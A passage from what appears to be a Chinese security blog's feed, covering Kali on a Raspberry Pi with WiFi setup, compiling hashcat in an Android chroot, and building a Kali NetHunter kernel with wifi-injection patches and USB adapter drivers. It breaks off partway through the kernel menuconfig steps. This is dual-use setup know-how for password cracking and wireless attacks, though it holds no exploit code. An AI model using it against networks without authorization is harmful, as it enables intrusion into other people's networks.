<h1 id="0x03-解压镜像并烧录到内存卡"><a href="#0x03-解压镜像并烧录到内存卡" class="headerlink" title="0x03 解压镜像并烧录到内存卡"></a>0x03 解压镜像并烧录到内存卡</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><ul>
<li>7-Zip <a href="https://www.7-zip.org/a/7z1900-x64.exe">传送门</a></li>
<li>Etcher <a href="https://www.balena.io/etcher/">传送门</a></li>
</ul>
<h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xzcat kali-linux-2019.1-rpi3-nexmon-64.img.xz | <span class="built_in">dd</span> of=/dev/sdb bs=512k</span><br></pre></td></tr></table></figure>
<p>PS:此处的<code>/dev/sdb</code>是你的内存卡在Linux下的磁盘盘符，具体以<code>fdisk -l</code>的输出结果为准！</p>
<h1 id="0x04-SSH登录树莓派"><a href="#0x04-SSH登录树莓派" class="headerlink" title="0x04 SSH登录树莓派"></a>0x04 SSH登录树莓派</h1><p>首先需要将树烧录好镜像的内存卡插入到树莓派然后接通电源等待开机。然后可以通过将网线插入到树莓派的RJ45接口或者用手机USB共享网络的方式给树莓派提供网络。</p>
<p>接着在终端下执行<code>arp -a</code>来获得树莓派的IP地址。(我这里通过安卓手机USB共享网络来获得，IP为192.168.43.74，实际IP以你实际情况为准)<br>已获得树莓派IP地址后就可以SSH登录到树莓派，默认用户名为<code>root</code>，密码为<code>toor</code>.</p>
<h2 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h2><ul>
<li>Putty <a href="https://the.earth.li/~sgtatham/putty/0.71/w64/putty.exe">传送门</a></li>
</ul>
<h2 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.43.74</span><br></pre></td></tr></table></figure>

<h1 id="0x05-编辑Interfaces配置文件"><a href="#0x05-编辑Interfaces配置文件" class="headerlink" title="0x05 编辑Interfaces配置文件"></a>0x05 编辑Interfaces配置文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>
<p>正常情况下配置文件里面是这样的内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto lo iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0 iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>

<h1 id="如果要配置WiFi我们需要将这两行内容注释掉，并在最下面添加这几行内容0x06-编辑WiFi配置文件"><a href="#如果要配置WiFi我们需要将这两行内容注释掉，并在最下面添加这几行内容0x06-编辑WiFi配置文件" class="headerlink" title="如果要配置WiFi我们需要将这两行内容注释掉，并在最下面添加这几行内容0x06 编辑WiFi配置文件"></a>如果要配置WiFi我们需要将这两行内容注释掉，并在最下面添加这几行内容<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line">wpa_conf /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure><br>0x06 编辑WiFi配置文件</h1><p>在&#x2F;etc&#x2F;wpa_supplicant&#x2F;目录下创建一个名为<code>wpa_supplicant.conf</code>的文件并编辑以下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">network=&#123;</span><br><span class="line"></span><br><span class="line">ssid=<span class="string">&quot;Your SSID&quot;</span></span><br><span class="line"></span><br><span class="line">psk=<span class="string">&quot;Your password&quot;</span></span><br><span class="line"></span><br><span class="line">key_mgmt=WPA-PSK</span><br><span class="line"></span><br><span class="line">priority=</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的ssid填为你自己WiFi的SSID，密码对应，key_mgnt选择加密方式，priority选择对应优先级，如果保存多个ssid的话优先级越大就最先选择这个WiFi去连接。这里我的例子为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">network=&#123;</span><br><span class="line"></span><br><span class="line">ssid=<span class="string">&quot;Hacker&quot;</span></span><br><span class="line"></span><br><span class="line">psk=<span class="string">&quot;1234567890&quot;</span></span><br><span class="line"></span><br><span class="line">key_mgmt=WPA-PSK</span><br><span class="line"></span><br><span class="line">priority=5</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据你自己的实际情况编辑即可。编辑完以后重启network服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>

<p>之后就可以等待树莓派连接到指定的WiFi了！</p>
<h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><p><a href="https://blog.csdn.net/hktkfly6/article/details/73302648">树莓派连接WiFi(最稳定的办法)</a></p>
<p><a href="https://www.zhaoyanchang.com/detail/10.html">树莓派装kali linux wifi无线网络连接设置</a></p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>RaspberryPi</tag>
        <tag>Hardware</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓Chroot环境使用Hashcat</title>
    <url>/2018/12/05/android-chroot-hashcat.html</url>
    <content><![CDATA[<h1 id="0x00-环境要求"><a href="#0x00-环境要求" class="headerlink" title="0x00 环境要求"></a>0x00 环境要求</h1><p>·已安装Chroot Linux的安卓手机一部</p>
<p>·可靠的的互联网连接</p>
<span id="more"></span>
<h1 id="0x01-更新软件源并安装相关依赖"><a href="#0x01-更新软件源并安装相关依赖" class="headerlink" title="0x01 更新软件源并安装相关依赖"></a>0x01 更新软件源并安装相关依赖</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install git boinc-client-opencl opencl-headers firmware-qcom-media u-boot-qcom qbzr qcomicbook clinfo</span><br></pre></td></tr></table></figure>
<h1 id="0x02-下载源码仓库"><a href="#0x02-下载源码仓库" class="headerlink" title="0x02 下载源码仓库"></a>0x02 下载源码仓库</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hashcat/hashcat.git</span><br></pre></td></tr></table></figure>
<h1 id="0x03-切换进源码目录并注册OpenCL-Headers"><a href="#0x03-切换进源码目录并注册OpenCL-Headers" class="headerlink" title="0x03 切换进源码目录并注册OpenCL Headers"></a>0x03 切换进源码目录并注册OpenCL Headers</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> hashcat &amp;&amp; git submodule update --init</span><br></pre></td></tr></table></figure>
<h1 id="0x04-编译安装"><a href="#0x04-编译安装" class="headerlink" title="0x04 编译安装"></a>0x04 编译安装</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<h1 id="0x05-运行测试"><a href="#0x05-运行测试" class="headerlink" title="0x05 运行测试"></a>0x05 运行测试</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -I &amp;&amp; hashcat -m 2500 -b</span><br></pre></td></tr></table></figure>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/test.png" alt="test"><br>感谢群友***@至尊天下*** 提供技术支持！</p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>chroot</tag>
        <tag>deploy</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux NetHunter内核编译指南</title>
    <url>/2021/09/12/build-nethunter-kernel.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>近年来随着各种HVV活动的兴起，各种新的概念层出不穷。其中就有近源渗透这个概念。<br>黑客行走江湖，哪儿能没有些趁手的兵器装备呢？ 相信很多人都曾梦想过拥有一台黑客专属手机，走到哪儿黑到哪儿。那么现实中这样的手机存在吗？答案是肯定的！NetHunter就能满足你所有的需求！<br><a href="https://www.kali.org/docs/nethunter/">Kali Linux NetHunter</a>是由<em>Offensive-Security</em>团队打造的基于Android平台的渗透测试环境。<br>通过使用<em>Kali Linux NetHunter</em>我们可以使用诸如外接无线网卡破解WiFi，模拟BadUSB设备进行HID攻击，外接USB蓝牙适配器进行蓝牙攻击……等各种近源渗透活动。<br>在<em>Kali Linux NetHunter</em><a href="https://www.kali.org/docs/nethunter/">官网</a>我们可以查阅官方支持的设备型号列表。  </p>
<span id="more"></span>
<h4 id="对读者的要求"><a href="#对读者的要求" class="headerlink" title="对读者的要求"></a>对读者的要求</h4><p>如果你会玩安卓刷机且手机型号恰好被官方支持，那么直接按照<a href="https://www.kali.org/docs/nethunter/installing-nethunter">官方教程</a>一步步来就好。<br>如果很不幸你的手机不被官方所支持但你会玩Linux且懂一些安卓开发以及C语言方面的知识想给自己的手机适配NetHunter，那么本篇教程就带你如何给一台不被官方支持的手机适配Kali NetHunter。  </p>
<h4 id="开始前的准备"><a href="#开始前的准备" class="headerlink" title="开始前的准备"></a>开始前的准备</h4><p>· 一台能解锁BootLoader且内核源码开源的安卓手机<br>· 一台高性能x86_64 PC  </p>
<h4 id="内核源码的选择"><a href="#内核源码的选择" class="headerlink" title="内核源码的选择"></a>内核源码的选择</h4><p>一般来说，手机厂商开源的内核源码代码质量参差不齐（一言难尽），如果我们要选择自己适配NetHunter的话最好选择知名第三方开发者Fork的源码进行编译。<br>比较知名的有：<br>· <a href="https://github.com/LineageOS/">LineageOS</a><br>· <a href="https://github.com/PixelExperience-Devices/">PixelExperience</a><br>· <a href="https://github.com/crdroidandroid/">crDroid</a><br>· <a href="https://github.com/mokee/">MoKee</a><br>· <a href="https://github.com/Havoc-OS/">Havoc-OS</a><br>· <a href="https://github.com/arter97/">Arter97</a><br>…等，这里不再一一列举。</p>
<h4 id="交叉编译工具链的选择"><a href="#交叉编译工具链的选择" class="headerlink" title="交叉编译工具链的选择"></a>交叉编译工具链的选择</h4><p>对于较老版本的内核（3.18.x以下）的一般是使用Google GCC4.9<br>对于较新版本的内核（4.4.x以上）的建议使用Clang来编译<br>对于Google gcc编译器，使用以下命令下载<br>64位：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9 -b android-10.0.0_r32 --depth=1</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9 -b android-10.0.0_r32 --depth=1</span><br></pre></td></tr></table></figure>
<p>对于Clang编译器，使用以下命令下载<br>Google官方Clang：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/clang/host/linux-x86 --depth=1</span><br></pre></td></tr></table></figure>
<p>Proton-clang:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/kdrag0n/proton-clang.git --depth=1</span><br></pre></td></tr></table></figure>
<h4 id="如何查找自己手机的内核源码"><a href="#如何查找自己手机的内核源码" class="headerlink" title="如何查找自己手机的内核源码"></a>如何查找自己手机的内核源码</h4><p>对于已经开源内核源码的手机来说，一般只需要在GitHub上搜索关键字就能找到适合你的内核源码<br>一般搜索的关键字为<code>android_kernel_&lt;设备厂商名&gt;_&lt;设备CPU代号名&gt;</code><br>或者<code>kernel_&lt;设备厂商名&gt;_&lt;设备CPU代号&gt;</code><br>又或者<code>kernel_&lt;设备厂商名&gt;_&lt;设备代号&gt;</code><br>举个例子来说，我的设备是<em>小米Redmi 4X</em>，设备厂商是<em>xiaomi</em>，CPU代号是<em>MSM8937</em>，设备代号是<em>santoni</em>那么就可以在GitHub上搜索关键字<code>android_kernel_xiaomi_msm8937</code>或者<code>kernel_xiaomi_santoni</code>或者<code>kernel_xiaomi_msm8937</code>来找对应设备的内核源码。<br>这里还要注意的一点是所选取的内核源码尽量要与当前手机所使用的ROM Android版本对应，比如如果手机所使用的ROM是LineageOS的那就去找LineageOS所对应的内核源码，且分支也要一一对应。<br>当然你也可以选择在<a href="https://www.xda-developers.com/">XDA论坛</a>寻找其他第三方优秀作者提供的内核源码。</p>
<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><p>我这里使用VMware虚拟机安装Kali Linux系统来进行演示</p>
<p><em>Kali Linux</em>最新镜像 <a href="https://mirrors.bfsu.edu.cn/kali-images/kali-weekly/">下载链接</a>  </p>
<p><em>VMware Workstation Pro</em>虚拟机 <a href="https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html">下载链接</a>  </p>
<p><em>ADB-FASTBOOT工具</em> for Linux <a href="https://dl.google.com/android/repository/platform-tools-latest-linux.zip">下载链接</a></p>
<h2 id="0x02-系统设置"><a href="#0x02-系统设置" class="headerlink" title="0x02 系统设置"></a>0x02 系统设置</h2><h4 id="设置更新源"><a href="#设置更新源" class="headerlink" title="设置更新源"></a>设置更新源</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb https://mirrors.bfsu.edu.cn/kali kali-rolling main non-free contrib&quot;</span> &gt; /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<h4 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt upgrade -y &amp;&amp; apt full-upgrade -y &amp;&amp; reboot</span><br></pre></td></tr></table></figure>

<h2 id="0x03-安装编译依赖"><a href="#0x03-安装编译依赖" class="headerlink" title="0x03 安装编译依赖"></a>0x03 安装编译依赖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y curl wget vim git ccache automake flex lzop bison gperf \</span><br><span class="line">build-essential zip zlib1g-dev g++-multilib libxml2-utils bzip2 libbz2-dev \</span><br><span class="line">libbz2-1.0 libghc-bzlib-dev squashfs-tools pngcrush schedtool dpkg-dev \</span><br><span class="line">liblz4-tool make optipng maven libssl-dev pwgen libswitch-perl \</span><br><span class="line">policycoreutils minicom libxml-sax-base-perl libxml-simple-perl bc \</span><br><span class="line">libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev \</span><br><span class="line">libgl1-mesa-dev xsltproc unzip device-tree-compiler kmod python3 python3-pip</span><br></pre></td></tr></table></figure>

<h2 id="0x04-下载交叉编译工具链"><a href="#0x04-下载交叉编译工具链" class="headerlink" title="0x04 下载交叉编译工具链"></a>0x04 下载交叉编译工具链</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/kdrag0n/proton-clang.git /root/proton-clang --depth=1</span><br></pre></td></tr></table></figure>

<h2 id="0x05-下载内核源码"><a href="#0x05-下载内核源码" class="headerlink" title="0x05 下载内核源码"></a>0x05 下载内核源码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/crdroidandroid/android_kernel_xiaomi_msm8937.git</span><br><span class="line"><span class="built_in">cd</span> android_kernel_xiaomi_msm8937</span><br></pre></td></tr></table></figure>

<h2 id="0x06-编译内核"><a href="#0x06-编译内核" class="headerlink" title="0x06 编译内核"></a>0x06 编译内核</h2><h4 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export ARCH=arm64</span><br><span class="line">export SUBARCH=arm64</span><br><span class="line">export KBUILD_BUILD_HOST=kali</span><br><span class="line">export KBUILD_BUILD_USER=root</span><br><span class="line">export LOCALVERSION=-NetHunter</span><br><span class="line">export PATH=&quot;/root/proton-clang/bin:$PATH&quot;</span><br><span class="line">mkdir out</span><br><span class="line">args=&quot;-j$(nproc --all) \</span><br><span class="line">ARCH=arm64 \</span><br><span class="line">SUBARCH=arm64 \</span><br><span class="line">O=out \</span><br><span class="line">CC=clang \</span><br><span class="line">CROSS_COMPILE=aarch64-linux-gnu- \</span><br><span class="line">CROSS_COMPILE_ARM32=arm-linux-gnueabi- \</span><br><span class="line">CLANG_TRIPLE=aarch64-linux-gnu- \</span><br><span class="line">AR=llvm-ar \</span><br><span class="line">NM=llvm-nm \</span><br><span class="line">OBJCOPY=llvm-objcopy \</span><br><span class="line">OBJDUMP=llvm-objdump \</span><br><span class="line">STRIP=llvm-strip &quot;</span><br></pre></td></tr></table></figure>
<h4 id="打入补丁"><a href="#打入补丁" class="headerlink" title="打入补丁"></a>打入补丁</h4><p>这里根据你的内核版本选择对应内核版本的补丁(patches)<br>我这里内核是4.9所以选择4.9内核的补丁</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git</span><br><span class="line">patch -p1 &lt; kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch</span><br><span class="line">patch -p1 &lt; kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch</span><br></pre></td></tr></table></figure>

<h4 id="生成defconfig"><a href="#生成defconfig" class="headerlink" title="生成defconfig"></a>生成defconfig</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> mrproper</span><br><span class="line">make <span class="variable">$&#123;args&#125;</span> santoni_treble_defconfig</span><br></pre></td></tr></table></figure>
<h4 id="图形化配置内核选项"><a href="#图形化配置内核选项" class="headerlink" title="图形化配置内核选项"></a>图形化配置内核选项</h4><p>以下内容不同版本内核可能会有所不同，以实际情况为准！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> menuconfig</span><br></pre></td></tr></table></figure>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/menuconfig.png" alt="menuconfig" title="menuconfig"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">首先进入<span class="string">&quot;Gerenal Setup&quot;</span>  </span><br><span class="line">选择到<span class="string">&quot;Local version - append to kernel release&quot;</span>  </span><br><span class="line">清空里面所有内容  </span><br><span class="line">然后取消勾选<span class="string">&quot;Automatically append version information to the version string&quot;</span>  </span><br><span class="line">接着选中<span class="string">&quot;Default hostname&quot;</span>，输入<span class="string">&quot;kali&quot;</span>  </span><br><span class="line">接着勾选<span class="string">&quot;System V IPC&quot;</span>  </span><br><span class="line">然后返回上一级菜单  </span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/general.png" alt="general" title="general"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Enable loadable module support&quot;</span>  </span><br><span class="line">勾选以下几个选项:  </span><br><span class="line"><span class="string">&quot;loadable module support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Forced module loading&quot;</span>  </span><br><span class="line"><span class="string">&quot;Modules unloading&quot;</span>  </span><br><span class="line"><span class="string">&quot;Forced module unloading&quot;</span>  </span><br><span class="line"><span class="string">&quot;Module versioning support&quot;</span>  </span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/module.png" alt="module" title="module"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Networking support&quot;</span> -&gt; <span class="string">&quot;Bluetooth subsystem support&quot;</span> -&gt; <span class="string">&quot;Bluetooth drivers support&quot;</span>  </span><br><span class="line">勾选以下几个选项:  </span><br><span class="line"><span class="string">&quot;HCI USB driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;Broadcom protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;HCI UART driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;HCI BCM203x USB driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;HCI BPA10x USB driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;HCI BlueFRITZ! USB driver&quot;</span>  </span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/bluetooth_driver.png" alt="bluetooth-driver" title="bluetooth-driver"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;Bluetooth Classic (BR/EDR) features&quot;</span>  </span><br><span class="line"><span class="string">&quot;RFCOMM protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;RFCOMM TTY support&quot;</span>  </span><br><span class="line"><span class="string">&quot;BNEP protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;HIDP protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Bluetooth Low Energy (LE) features&quot;</span>  </span><br><span class="line">然后返回上一级菜单  </span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/bluetooth_subsystem.png" alt="bluetooth" title="bluetooth"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进入到<span class="string">&quot;Wireless&quot;</span>  勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;nl80211 testmode command&quot;</span>  </span><br><span class="line"><span class="string">&quot;use statically compiled regulatory rules database&quot;</span>  </span><br><span class="line"><span class="string">&quot;cfg80211 wireless extensions compatibility&quot;</span>  </span><br><span class="line"><span class="string">&quot;Generic IEEE 802.11 Networking Stack (mac80211)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Enable mac80211 mesh networking (pre-802.11s) support&quot;</span>  </span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/wireless.png" alt="wireless" title="wireless"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Device Drivers&quot;</span> -&gt; <span class="string">&quot;Network device support&quot;</span> -&gt; <span class="string">&quot;USB Network Adapters&quot;</span>  </span><br><span class="line">勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;USB RTL8150 based ethernet device support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek RTL8152/RTL8153 Based USB Ethernet Adapters&quot;</span>  </span><br><span class="line"><span class="string">&quot;ASIX AX88xxx Based USB 2.0 Ethernet Adapters&quot;</span>  </span><br><span class="line"><span class="string">&quot;ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet&quot;</span>. </span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_network.png" alt="usb_net" title="usb_net"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Wireless LAN&quot;</span>  </span><br><span class="line">勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;Atheros/Qualcomm devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;Atheros HTC based wireless cards support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Linux Community AR9170 802.11n USB support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Atheros mobile chipsets support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Atheros ath6kl USB support&quot;</span>  </span><br><span class="line"><span class="string">&quot;MediaTek devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;MediaTek MT7601U (USB) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ralink devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ralink driver support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek 8187 and 8187B USB support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek rtlwifi family of devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;ZyDAS devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB ZD1201 based Wireless device support&quot;</span>  </span><br><span class="line"><span class="string">&quot;ZyDAS ZD1211/ZD1211B USB-wireless support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Wireless RNDIS USB support&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;Ralink driver support&quot;</span>中勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;Ralink rt2500 (USB) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ralink rt2501/rt73 (USB) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ralink rt27xx/rt28xx/rt30xx (USB) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt33xx devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for unknown (USB) devices&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;Realtek rtlwifi family of devices&quot;</span> 中勾选</span><br><span class="line"><span class="string">&quot;Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter&quot;</span>  </span><br><span class="line">然后返回主菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/wireless_lan.png" alt="Atheros" title="Atheros">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/mediatek.png" alt="MediaTek" title="MediaTek">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/ralink.png" alt="Ralink" title="Ralink">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/realtek.png" alt="Realtek" title="Realtek">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/zydas.png" alt="ZyDAS" title="ZyDAS"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进入到<span class="string">&quot;Device Drivers&quot;</span> -&gt; <span class="string">&quot;Multimedia support&quot;</span> 勾选：  </span><br><span class="line"><span class="string">&quot;Digital TV support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Software defined radio support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Media USB Adapters&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;Media USB Adapters&quot;</span>中 勾选：  </span><br><span class="line"><span class="string">&quot;Airspy&quot;</span>  </span><br><span class="line"><span class="string">&quot;HackRF&quot;</span>  </span><br><span class="line"><span class="string">&quot;Mirics MSi 2500&quot;</span>  </span><br><span class="line">然后拉到最下面，取消勾选  <span class="string">&quot;Autoselect ancillary drivers (tuners, sensors, i2c, spi, frontends)&quot;</span>  </span><br><span class="line">取消勾选 <span class="string">&quot;I2C Encoders, decoders, sensors and other helper chips&quot;</span> 内所有选项  </span><br><span class="line">取消勾选 <span class="string">&quot;Customize TV tuners&quot;</span> 内除了 <span class="string">&quot;Rafael Micro R820T silicon tuner&quot;</span> 以外所有选项  </span><br><span class="line">在 <span class="string">&quot;Customise DVB Frontends&quot;</span> 内取消勾选除了：  </span><br><span class="line"><span class="string">&quot;Realtek RTL2830 DVB-T&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek RTL2832 DVB-T&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek RTL2832 SDR&quot;</span>  </span><br><span class="line">以外所有的选项  </span><br><span class="line">然后返回主菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/multimedia.png" alt="Multimedia_support" title="Multimedia_support">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/media_usb.png" alt="Media_usb" title="Media_usb">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/unselect.png" alt="unselect" title="unselect">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/i2c_encoder.png" alt="I2C_EN" title="I2C_EN">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/custom_tv.png" alt="Custom_TV" title="Custom_TV"><br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/custom_dvb.png" alt="Custom_DVB" title="Custom_DVB"></p>
